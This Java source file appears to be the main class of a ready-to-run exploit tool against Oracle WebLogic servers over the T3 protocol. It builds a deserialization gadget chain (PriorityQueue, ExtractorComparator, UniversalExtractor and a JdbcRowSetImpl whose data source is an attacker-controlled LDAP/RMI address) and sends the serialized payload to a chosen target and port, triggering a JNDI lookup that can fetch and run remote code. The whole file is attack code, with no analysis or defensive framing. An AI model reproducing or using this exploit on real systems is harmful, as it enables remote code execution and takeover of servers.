package pub.fuzz;

import com.sun.rowset.JdbcRowSetImpl;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.UniversalExtractor;
import com.tangosol.util.comparator.ExtractorComparator;
import pub.fuzz.t3.T3ProtocolOperation;
import pub.fuzz.utils.Reflections;
import pub.fuzz.utils.Serializables;

import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class main {
    public static void banner(){
        System.out.println("     QQQQQQQQQ");
        System.out.println("   QQ:::::::::QQ");
        System.out.println(" QQ:::::::::::::QQ");
        System.out.println("Q:::::::QQQ:::::::Q");
        System.out.println("Q::::::O   Q::::::Q uuuuuu    uuuuuu    aaaaaaaaaaaaa   nnnn  nnnnnnnn");
        System.out.println("Q:::::O     Q:::::Q u::::u    u::::u    a::::::::::::a  n:::nn::::::::nn");
        System.out.println("Q:::::O     Q:::::Q u::::u    u::::u    aaaaaaaaa:::::a n::::::::::::::nn");
        System.out.println("Q:::::O     Q:::::Q u::::u    u::::u             a::::a nn:::::::::::::::n");
        System.out.println("Q:::::O     Q:::::Q u::::u    u::::u      aaaaaaa:::::a   n:::::nnnn:::::n");
        System.out.println("Q:::::O     Q:::::Q u::::u    u::::u    aa::::::::::::a   n::::n    n::::n");
        System.out.println("Q:::::O  QQQQ:::::Q u::::u    u::::u   a::::aaaa::::::a   n::::n    n::::n");
        System.out.println("Q::::::O Q::::::::Q u:::::uuuu:::::u  a::::a    a:::::a   n::::n    n::::n");
        System.out.println("Q:::::::QQ::::::::Q u:::::::::::::::uua::::a    a:::::a   n::::n    n::::n");
        System.out.println(" QQ::::::::::::::Q   u:::::::::::::::ua:::::aaaa::::::a   n::::n    n::::n");
        System.out.println("   QQ:::::::::::Q     uu::::::::uu:::u a::::::::::aa:::a  n::::n    n::::n");
        System.out.println("     QQQQQQQQ::::QQ     uuuuuuuu  uuuu  aaaaaaaaaa  aaaa  nnnnnn    nnnnnn");
        System.out.println("             Q:::::Q");
        System.out.println("              QQQQQQ");
        String info = "Usage: java -jar WeblogicT3.jar -Target 127.0.0.1 -Port [7001] -RMI ldap://127.0.0.1:1389/dozvtq [--SSL]";
            System.out.println(info);
    }
    public static void main(String arg[]) throws Exception {
            String target = "",rmiAddress = "";
            int Port = 7001;
            boolean SSL = false;

           for(int i=0;i<arg.length;i++){
               if(arg[i].equals("-Target")){
                target = arg[i+1];
               }
               if(arg[i].equals("-Port")){
                   Port = Integer.parseInt(arg[i+1]);
               }
               if(arg[i].equals("-RMI")){
                   rmiAddress = arg[i+1];
               }
               if(arg[i].equals("--SSL")){
                   SSL = true;
               }
           }
           if(target.equals("")||rmiAddress.equals("")){
               banner();
               return;
           }


        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");

        UniversalExtractor universalExtractor = new UniversalExtractor("getDatabaseMetaData()");
        JdbcRowSetImpl jdbcRowSet =  new JdbcRowSetImpl();
        Class clazz1 = JdbcRowSetImpl.class.getSuperclass();
        Field dataSource = clazz1.getDeclaredField("dataSource");
        dataSource.setAccessible(true);
        dataSource.set(jdbcRowSet,rmiAddress);
        ExtractorComparator extractorComparator = new ExtractorComparator(universalExtractor);

        PriorityQueue queue = new PriorityQueue(2);

        queue.add("1");
        queue.add("1");

        Class ext = PriorityQueue.class;
        Field comparator = ext.getDeclaredField("comparator");
        comparator.setAccessible(true);
        comparator.set(queue,extractorComparator);

        Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = jdbcRowSet;

        byte[] payload = Serializables.serialize(queue);

        T3ProtocolOperation.send(target, Port,SSL, payload);
    }
}
